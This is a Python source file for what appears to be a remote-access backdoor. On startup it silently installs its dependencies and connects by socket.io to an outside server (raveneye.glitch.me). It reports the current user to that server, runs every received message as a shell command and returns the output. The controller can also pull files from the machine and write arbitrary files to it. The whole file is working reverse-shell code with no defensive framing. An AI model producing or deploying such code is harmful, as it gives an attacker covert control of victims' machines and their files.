import importlib
import subprocess
import os
try: __import__('socketio')
except: subprocess.check_call(['pip', 'install', 'python-socketio', 'websocket-client'])
import socketio


sio = socketio.Client()
on = 'http://raveneye.glitch.me/'
off = 'http://localhost:3000/'
url = on
class Session:
    def __init__(self):
        self.current_directory = os.getcwd()
        self.exit_requested = False

session = Session()

@sio.on('connect')
def on_connect():
    global session
    whoami_output = execute_command('whoami')
    sio.emit('intro', whoami_output[:-1])

@sio.on('message')
def on_message(msg):
    global session

    if msg.lower() == 'exit':
        session.exit_requested = True
        sio.disconnect()
        return

    if msg.startswith('cd '):
        try:
            os.chdir(msg[3:].strip())
            session.current_directory = os.getcwd()
            sio.emit('message', f"Changed directory to: {session.current_directory}")
        except Exception as e:
            sio.emit('message', f"Error changing directory: {str(e)}")
    elif msg.startswith('download '):
        send_file(session.current_directory + '/' + msg[9:])
    else:
        output = execute_command(msg)
        sio.emit('message', output)

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, cwd=session.current_directory)
        return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
    except Exception as e:
        return f"Error: {str(e)}"

@sio.event
def updata(data):
    file_name = data['fileName']
    file_data = data['file']
    with open(file_name, 'wb') as file:
        file.write(file_data)
    sio.emit('message', 'Received!')

def send_file(file_path):
    file_name = os.path.basename(file_path)
    with open(file_path, "rb") as file:
        file_data = file.read()
        sio.emit('file_transfer', {'file_name': file_name, 'file_data': file_data})

sio.connect(url)

try:
    while not session.exit_requested:
        pass
except KeyboardInterrupt:
    pass
finally:
    sio.disconnect()
